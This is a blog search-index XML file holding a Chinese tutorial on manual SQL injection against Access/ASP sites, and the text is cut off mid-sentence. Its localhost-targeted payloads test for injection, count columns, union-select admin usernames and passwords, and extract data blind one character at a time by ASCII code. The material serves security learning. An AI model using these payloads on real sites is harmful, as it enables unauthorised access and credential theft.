<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入篇</title>
      <link href="/2024/02/21/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>/2024/02/21/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入篇"><a href="#SQL注入篇" class="headerlink" title="SQL注入篇"></a>SQL注入篇</h1><h2 id="access-asp-手工注入"><a href="#access-asp-手工注入" class="headerlink" title="access+asp 手工注入"></a>access+asp 手工注入</h2><h3 id="1、access数据库"><a href="#1、access数据库" class="headerlink" title="1、access数据库"></a>1、access数据库</h3><ul><li>access数据库与其他数据库不一样 他没有存储表的库，所以只能猜表。</li></ul><h3 id="2、access数据库结构"><a href="#2、access数据库结构" class="headerlink" title="2、access数据库结构"></a>2、access数据库结构</h3><ul><li>表</li><li>字段</li><li>数据</li></ul><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218153343144.png" alt="image-20240218153343144"></p><h3 id="3、判断是否存在注入"><a href="#3、判断是否存在注入" class="headerlink" title="3、判断是否存在注入"></a>3、判断是否存在注入</h3><ul><li><code>and</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   #  正确页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   # 错误页面<span class="keyword">or</span> 判断</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">-104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  # 错误页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>   # 正常页面</span><br></pre></td></tr></table></figure><h3 id="4、判断字段数"><a href="#4、判断字段数" class="headerlink" title="4、判断字段数"></a>4、判断字段数</h3><ul><li><code>order by</code> 判断当前表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 一直到出错，不出错的有多少个就是多少个字段数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">10</span>  # 正常</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">11</span>  # 错误</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218155121342.png" alt="image-20240218155121342"></p><h3 id="5、联合查询注入"><a href="#5、联合查询注入" class="headerlink" title="5、联合查询注入"></a>5、联合查询注入</h3><ul><li>猜表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 表存在就会出现些数字并显示，不存在则报错</span><br><span class="line"># 报错可以将 admin 换成别的表</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218155953387.png" alt="image-20240218155953387"></p><ul><li>猜字段</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 表存在就会出现些数字并显示，不存在则报错</span><br><span class="line"># 报错可以将 admin 换成别的表,也可以换字段添加或减少</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218155953387.png" alt="image-20240218155953387"></p><ul><li>查询数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 在显示数字上的文字替换要猜的字段</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br><span class="line">#如果显示不出可以在前面加<span class="operator">-</span>让它报错：http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">-110</span>，显示后面的<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">-110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218160631552.png" alt="image-20240218160631552"></p><ul><li>access数据库语句</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-110</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,password,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218162101764.png" alt="image-20240218162101764"></p><h2 id="access-asp-逐字猜解法"><a href="#access-asp-逐字猜解法" class="headerlink" title="access+asp 逐字猜解法"></a>access+asp 逐字猜解法</h2><h3 id="1、判断是否存在注入"><a href="#1、判断是否存在注入" class="headerlink" title="1、判断是否存在注入"></a>1、判断是否存在注入</h3><ul><li><code>and</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>  # 正确页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>  # 错误页面<span class="keyword">or</span> 判断</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 方法判断</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">-104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>   # 错误页面</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>ProductShow.asp?ID<span class="operator">=</span><span class="number">104</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>    # 正常页面</span><br></pre></td></tr></table></figure><h3 id="2、判断字段数"><a href="#2、判断字段数" class="headerlink" title="2、判断字段数"></a>2、判断字段数</h3><ul><li><code>order by</code> 判断当前表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 一直到出错，不出错的有多少个就是多少个字段数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">10</span>  # 正常</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">11</span>  # 错误</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218155121342.png" alt="image-20240218155121342"></p><h3 id="3、猜表"><a href="#3、猜表" class="headerlink" title="3、猜表"></a>3、猜表</h3><ul><li>使用<code>and</code> 和 <code>exists</code>函数猜表</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># URL 页面返回正常说明表存在，不存在则报错</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218164449653.png" alt="image-20240218164449653"></p><h3 id="4、猜列"><a href="#4、猜列" class="headerlink" title="4、猜列"></a>4、猜列</h3><ul><li>使用<code>and</code> 和 <code>exists</code>猜</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># URL 页面返回正常说明表存在，不存在则报错</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> username <span class="keyword">from</span> admin)</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> <span class="keyword">exists</span> (<span class="keyword">select</span> password <span class="keyword">from</span> admin)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218165517032.png" alt="image-20240218165517032"></p><h3 id="5、猜数据长度"><a href="#5、猜数据长度" class="headerlink" title="5、猜数据长度"></a>5、猜数据长度</h3><ul><li><code>len</code>函数，查询字段的长度</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># URL页面  等于<span class="number">8</span>就是确定数据的长度 也可以使用大于（<span class="operator">&gt;</span>）小于（<span class="operator">&lt;</span>）个人认为 等于（<span class="operator">=</span>）最好确定长度</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> len(username) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">8</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># access数据库</span><br><span class="line"># 从admin表中选取所有记录，并返回第一条记录的用户名长度</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> len(username) <span class="keyword">from</span> admin</span><br><span class="line">或</span><br><span class="line"># 从admin表中选取用户名长度为<span class="number">8</span>的记录，并返回第一条记录的用户名长度</span><br><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> LEN(username) <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> LEN(username) <span class="operator">=</span> <span class="number">8</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218172811804.png" alt="image-20240218172811804"></p><h3 id="6、查询数据asccii码"><a href="#6、查询数据asccii码" class="headerlink" title="6、查询数据asccii码"></a>6、查询数据asccii码</h3><ul><li><code>mid()</code> 函数，截取位置</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 从字符串<span class="string">&#x27;ads&#x27;</span>中提取从第<span class="number">1</span>个字符开始的长度为<span class="number">1</span>的子字符串</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;ads&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218174109525.png" alt="image-20240218174109525"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 从字符串<span class="string">&#x27;ads&#x27;</span>中提取从第<span class="number">2</span>个字符开始的长度为<span class="number">2</span>的子字符串</span><br><span class="line"># <span class="number">2</span>是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">2</span>是要提取的子字符串的长度。</span><br><span class="line"><span class="keyword">select</span> mid(<span class="string">&#x27;ads&#x27;</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240218174152687.png" alt="image-20240218174152687"></p><ul><li><code>asc() </code> 函数，查询ascii码</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># URL页面，猜测ascii码,两边为证真则页面返回正常，否则页面报错</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line"># <span class="number">97</span>的字符为a,<span class="number">100</span>的字符为d,拼接起来就是ad</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">97</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(username,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">100</span></span><br><span class="line">......</span><br><span class="line"># 猜测ascii码,两边为证真则页面返回正常，否则页面报错</span><br><span class="line"># <span class="number">1</span> 是提取子字符串的起始位置（从<span class="number">1</span>开始计数）,<span class="number">1</span> 是要提取的子字符串的长度。</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">100</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">99</span><span class="operator">/</span>shownews.asp?id<span class="operator">=</span><span class="number">110</span> <span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin)<span class="operator">=</span><span class="number">102</span></span><br><span class="line">......</span><br><span class="line"># 猜解完之后把ascii码转换过来并接就是该字段的的数据，其他字段也是这样。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">sql</span>语句</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(mid(password,<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219090226650.png" alt="image-20240219090226650"></p><h2 id="SQL注入类型的区分详解"><a href="#SQL注入类型的区分详解" class="headerlink" title="SQL注入类型的区分详解"></a>SQL注入类型的区分详解</h2><h3 id="1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种："><a href="#1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种：" class="headerlink" title="1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种："></a>1、HTTP协议中常用的数据传递方式可以分为GET请求、POST请求和Cookie三种：</h3><ul><li><code>GET</code> 请求方法<ul><li>GET请求的参数直接附加在URL后，通过问号（?）分隔主体与参数，多个参数使用&amp;符号分隔。</li><li>由于参数直接暴露在URL中，存在长度限制，特别是对包含中文字符的参数需要进行URL编码（使用 <code>%</code> 符号对非字母数字字符进行转义）以确保传输准确性。</li><li>GET请求的URL长度限制根据浏览器和服务器的设置，一般建议至少支持8KB的长度，但实际应用中可能更低。</li></ul></li></ul><p>详细可以参考<a href="https://www.cnblogs.com/cuihongyu3503319/p/5892257.html">URL最长的长度</a></p><ul><li><p><code>POST</code> 请求方法</p><ul><li>POST请求的参数通常放在请求体（Request Body）中，而非URL，因为请求体的内容不会像GET请求那样直接显示在URL中提高了安全性，特别适用于传递大量数据或敏感信息。</li><li>POST请求的数据量理论上没有硬性限制，但服务器和中间件可能会设定各自的限制。</li><li>POST 操作不具有幂等性，这意味着多次执行同样的 POST 请求可能会导致不同的结果（例如，在数据库中生成多条记录）。</li></ul></li><li><p><code>COOKIE</code> 方法</p><ul><li>Cookie 是由服务器发送到客户端（通常是浏览器）的一小段文本信息，它会被浏览器存储起来，并在后续对该服务器发起的请求中自动附带到请求头（<code>Cookie</code>字段）中。</li><li>服务器在接收请求时会从请求头中提取Cookie参数，用于识别和跟踪用户状态。</li><li>通过检查请求头中的Cookie字段，服务器获取和验证客户端的状态信息，用于在客户端和服务器之间维护会话状态，但需要注意安全性和隐私保护。</li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_GET</span>);    <span class="comment"># 打印出通过GET方法传递到当前脚本的所有参数及其对应值。</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;      <span class="comment"># 打印一个水平线，以提高可读性</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_POST</span>);   <span class="comment"># 打印出通过POST方法提交到当前脚本的所有参数及其对应值。</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;      <span class="comment"># 再次打印一个水平线</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_COOKIE</span>); <span class="comment"># 打印出当前请求中随HTTP头部一起发送的所有cookie及其对应值。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 运行这个脚本，它将显示这些数组的内容，提供了在处理通过不同HTTP方法发送的数据时进行调试和了解输入数据的方式。</span></span><br></pre></td></tr></table></figure><p>综合而言，GET用于简单的数据获取，POST适用于提交大量数据或敏感信息，而Cookie用于在客户端和服务器之间维护状态。</p><h3 id="2、-注入数据类型的区分"><a href="#2、-注入数据类型的区分" class="headerlink" title="2、 注入数据类型的区分"></a>2、 注入数据类型的区分</h3><p>在任何类型的注入中，闭合的目的是确保注入点不破坏原始SQL语句的结构，同时使得添加的条件始终为真。不进行闭合可能导致SQL语句出错，使得判断条件失效。</p><ul><li><code>int</code> 整型注入</li></ul><p>整型注入通常不需要闭合，但为了确保SQL语句结构的完整性，可以添加一个始终成立的条件，如 <code>&#39;x&#39; = &#39;x&#39;</code>。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span> `id` <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219105617580.png" alt="image-20240219105617580"></p><p>除了第一种以外 其余在判断注入或查询语句的时候都要进行闭合，不闭合 SQL语句不仅会出错，可能与原意不一样，会造成错误的判断。</p><ul><li><code>sting</code> 字符型注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="operator">=</span> <span class="string">&#x27;人事部&#x27;</span></span><br><span class="line"># 字符型 注入闭合示例，结果如下图：</span><br><span class="line"># 字符型注入需要在原始条件后添加一个始终成立的条件来闭合注入。</span><br><span class="line"># <span class="string">&#x27; AND &#x27;</span>x<span class="string">&#x27; = &#x27;</span>x<span class="string">&#x27; 这个部分就是闭合的部分</span></span><br><span class="line"><span class="string">SELECT* FROM`b-class` WHERE`class` = &#x27;</span>人事部<span class="string">&#x27; AND &#x27;</span>x<span class="string">&#x27; = &#x27;</span>x<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219110646765.png" alt="image-20240219110646765"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 如果<span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span>不相等，示例：<span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span>，有可能不显示 结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="operator">=</span> <span class="string">&#x27;人事部&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;x&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;xxx&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219111710572.png" alt="image-20240219111710572"></p><ul><li><code>like</code> 搜索型注入</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 示例，结果如下图：</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="keyword">LIKE</span> <span class="string">&#x27;%标题%&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219112145565.png" alt="image-20240219112145565"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">like</span> 模糊型注入闭合示例,结果如下图：</span><br><span class="line"># 模糊型注入需要在原始条件后添加一个始终成立的条件，确保注入点被正确闭合。</span><br><span class="line"><span class="keyword">SELECT</span><span class="operator">*</span> <span class="keyword">FROM</span>`b<span class="operator">-</span>class` <span class="keyword">WHERE</span>`class` <span class="keyword">LIKE</span> <span class="string">&#x27;%标题%&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1%&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1%&#x27;</span></span><br><span class="line"># <span class="operator">%</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; = &#x27;</span><span class="number">1</span> 这个是闭合的部分 不能有空格</span><br></pre></td></tr></table></figure><p><img src="C:\Users\20993\AppData\Roaming\Typora\typora-user-images\image-20240219113113783.png" alt="image-20240219113113783"></p><h3 id="3、注入方法区分"><a href="#3、注入方法区分" class="headerlink" title="3、注入方法区分"></a>3、注入方法区分</h3><ul><li><p><strong>联合查询注入(Union Select Injection)：</strong></p><ul><li>联合查询注入是通过在原始查询中使用 <code>UNION SELECT</code> 语句，将两个或多个表的结果合并，从而获取未授权的数据。</li><li>攻击者可能通过 <code>UNION SELECT</code> 操作来联合其他表，获取敏感信息。</li></ul></li><li><p><strong>报错注入 (Error-Based Injection):</strong></p><ul><li>报错注入是通过故意构造导致数据库报错的输入，以获取有关数据库结构的信息。</li><li>攻击者可能利用数据库报错信息获取表名、字段名等信息。</li></ul></li><li><p><strong>盲注入 (Blind 